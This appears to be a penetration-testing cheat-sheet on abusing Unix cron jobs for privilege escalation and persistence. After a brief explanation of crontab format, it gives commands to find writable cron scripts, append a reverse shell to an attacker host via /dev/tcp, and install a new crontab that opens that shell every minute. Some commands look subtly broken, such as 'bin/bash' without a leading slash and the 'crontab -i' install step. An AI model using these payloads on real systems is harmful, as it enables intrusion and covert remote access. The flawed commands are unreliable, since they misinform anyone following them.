**Cron jobs** are scheduled tasks on Unix-based systems that execute commands or scripts at specified intervals. They are managed by the `cron` daemon and are defined in crontab files.

## Basic Concepts

- **Crontab:** A configuration file where users define scheduled tasks.
- **Cron Format:** A cron job is specified using the following format:
```bash
* * * * * command_to_execute
| | | | |
| | | | +-- Day of the week (0 - 7) [Sunday=0/7]
| | | +---- Month (1 - 12)
| | +------ Day of the month (1 - 31)
| +-------- Hour (0 - 23)
+---------- Minute (0 - 59)
```

## Exploiting Misconfigured Cron Jobs

Cron jobs can be exploited if:

- They execute files in writable locations (e.g., `/tmp`).
- They run scripts or binaries with elevated privileges.

1. **Identify Cron Jobs**

```bash
crontab -l
# Or
cat /etc/crontab
```

2. **Check Permissions:** Ensure the target script or command is writable.

```bash
ls -l /path/to/cron_script.sh
```

3. **Modify the Script:** Insert malicious payloads, such as spawning a reverse shell.

```bash
echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" >> /path/to/cron_script.sh
```


## Create a new Cron Job
1. **Create a Cron Job in a File**  
Use `echo` to define the cron job and redirect it to a file:
```bash
echo "* * * * * /bin/bash -c 'bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > <new_file>
```

2. **Install the Cron Job Using `crontab`**  
Use the `crontab` command to install the cron job from the file:

```bash
crontab -i <new_file>
```

3. **Verify the Cron Job**  
Check if the cron job was successfully added:

```bash
crontab -l
```
This should display:
```bash
* * * * * /bin/bash -c 'bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
```

